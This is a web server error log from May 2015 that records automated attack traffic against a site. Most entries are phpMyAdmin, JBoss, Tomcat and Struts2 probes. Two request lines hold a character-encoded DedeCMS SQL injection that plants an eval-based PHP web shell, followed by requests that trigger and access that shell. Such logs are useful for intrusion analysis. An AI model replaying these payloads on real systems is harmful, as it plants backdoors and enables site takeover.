[ 2015-05-24T02:29:03+08:00 ] 199.48.147.141 /pontorez/includes/templates/error.tpl
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000372s ]
ERR: 无法加载模块:Pontorez

[ 2015-05-24T08:08:46+08:00 ] 216.99.157.189 /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=49&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=53&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=119&arrs2[]=119&arrs2[]=119&arrs2[]=46&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=99&arrs2[]=111&arrs2[]=109&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000365s ]
ERR: 无法加载模块:Plus

[ 2015-05-24T08:08:47+08:00 ] 216.99.157.189 /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=49&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=53&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=119&arrs2[]=119&arrs2[]=119&arrs2[]=46&arrs2[]=101&arrs2[]=55&arrs2[]=120&arrs2[]=117&arrs2[]=101&arrs2[]=46&arrs2[]=99&arrs2[]=111&arrs2[]=109&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000309s ]
ERR: 无法加载模块:Plus

[ 2015-05-24T08:08:47+08:00 ] 216.99.157.189 /plus/mytag_js.php?aid=19015
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000326s ]
ERR: 无法加载模块:Plus

[ 2015-05-24T08:08:47+08:00 ] 216.99.157.189 /plus/mytag_js.php?aid=19015
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
ERR: 无法加载模块:Plus

[ 2015-05-24T08:08:47+08:00 ] 216.99.157.189 /plus/e7xue.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
ERR: 无法加载模块:Plus

[ 2015-05-24T10:26:08+08:00 ] 220.133.133.5 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000317s ]
ERR: 无法加载模块:PhpMyAdmin

[ 2015-05-24T10:26:09+08:00 ] 220.133.133.5 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000307s ]
ERR: 无法加载模块:Pma

[ 2015-05-24T10:26:09+08:00 ] 220.133.133.5 /myadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: 无法加载模块:Myadmin

[ 2015-05-24T11:10:28+08:00 ] 210.109.0.67 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000319s ]
ERR: 无法加载模块:PhpMyAdmin

[ 2015-05-24T11:10:28+08:00 ] 210.109.0.67 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000531s ]
ERR: 无法加载模块:Pma

[ 2015-05-24T11:10:28+08:00 ] 210.109.0.67 /myadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000299s ]
ERR: 无法加载模块:Myadmin

[ 2015-05-24T11:59:50+08:00 ] 157.55.39.94 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000307s ]
ERR: 无法加载模块:Robots

[ 2015-05-24T14:17:54+08:00 ] 106.39.95.194 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
ERR: 无法加载模块:Robots

[ 2015-05-24T14:17:54+08:00 ] 106.39.95.194 /moadmin.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000282s ]
ERR: 无法加载模块:Moadmin

[ 2015-05-24T14:17:54+08:00 ] 106.39.95.194 /DevInfo.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
ERR: 无法加载模块:DevInfo

[ 2015-05-24T15:05:32+08:00 ] 201.103.198.165 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000395s ]
ERR: 无法加载模块:PhpMyAdmin

[ 2015-05-24T15:05:33+08:00 ] 201.103.198.165 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Pma

[ 2015-05-24T15:05:33+08:00 ] 201.103.198.165 /myadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: 无法加载模块:Myadmin

[ 2015-05-24T15:47:50+08:00 ] 60.28.135.186 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Manager

[ 2015-05-24T19:15:17+08:00 ] 121.41.172.95 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:PhpMyAdmin

[ 2015-05-24T19:15:18+08:00 ] 121.41.172.95 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:Pma

[ 2015-05-24T19:15:18+08:00 ] 121.41.172.95 /myadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000322s ]
ERR: 无法加载模块:Myadmin

[ 2015-05-24T19:56:17+08:00 ] 66.249.64.195 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000301s ]
ERR: 无法加载模块:Robots

[ 2015-05-24T21:41:32+08:00 ] 121.42.0.36 /webdav/b5d04dc2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:Webdav

[ 2015-05-24T21:41:33+08:00 ] 121.42.0.36 /admin/control/wxpay.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Admin

[ 2015-05-24T21:41:34+08:00 ] 121.42.0.36 /shop/templates/default/store/goods.ncsaleing.php?a=var_dump&b=vulnerable
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:Shop

[ 2015-05-24T21:41:37+08:00 ] 121.42.0.36 /jmx-console/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
ERR: 无法加载模块:Jmx-console

[ 2015-05-24T21:41:37+08:00 ] 121.42.0.36 /web-console/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Web-console

[ 2015-05-24T21:41:39+08:00 ] 121.42.0.36 /invoker/JMXInvokerServlet
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
ERR: 无法加载模块:Invoker

[ 2015-05-24T21:41:39+08:00 ] 121.42.0.36 /invoker/EJBInvokerServlet
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
ERR: 无法加载模块:Invoker

[ 2015-05-24T21:41:41+08:00 ] 121.42.0.36 /status/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000293s ]
ERR: 无法加载模块:Status

[ 2015-05-24T21:41:42+08:00 ] 121.42.0.36 /server-status/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: 无法加载模块:Server-status

[ 2015-05-24T21:41:46+08:00 ] 121.42.0.36 /login.action?debug=browser
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Login

[ 2015-05-24T21:41:48+08:00 ] 121.42.0.36 /admin.action?debug=browser
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000374s ]
ERR: 无法加载模块:Admin

[ 2015-05-24T21:41:49+08:00 ] 121.42.0.36 /index.action?debug=browser
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
ERR: 无法加载模块:Index

[ 2015-05-24T21:41:51+08:00 ] 121.42.0.36 /login.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000316s ]
ERR: 无法加载模块:Login

[ 2015-05-24T21:41:53+08:00 ] 121.42.0.36 /admin.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000325s ]
ERR: 无法加载模块:Admin

[ 2015-05-24T21:41:55+08:00 ] 121.42.0.36 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000292s ]
ERR: 无法加载模块:Index

[ 2015-05-24T21:42:05+08:00 ] 121.42.0.36 /index.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
ERR: 无法加载模块:Index

[ 2015-05-24T21:42:08+08:00 ] 121.42.0.36 /login.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Login

[ 2015-05-24T21:42:09+08:00 ] 121.42.0.36 /admin.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000325s ]
ERR: 无法加载模块:Admin

[ 2015-05-24T21:42:23+08:00 ] 121.42.0.36 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Manager

[ 2015-05-24T21:42:29+08:00 ] 121.42.0.36 /phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Phpmyadmin

[ 2015-05-24T21:42:31+08:00 ] 121.42.0.36 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000300s ]
ERR: 无法加载模块:PhpMyAdmin

[ 2015-05-24T21:42:33+08:00 ] 121.42.0.36 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Pma

[ 2015-05-24T21:42:35+08:00 ] 121.42.0.36 /pmd/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: 无法加载模块:Pmd

[ 2015-05-24T22:44:20+08:00 ] 200.69.127.173 /user/soapCaller.bs
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
ERR: 无法加载模块:User

[ 2015-05-24T23:58:03+08:00 ] 121.42.0.31 /webscan38502863.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
ERR: 无法加载模块:Webscan38502863

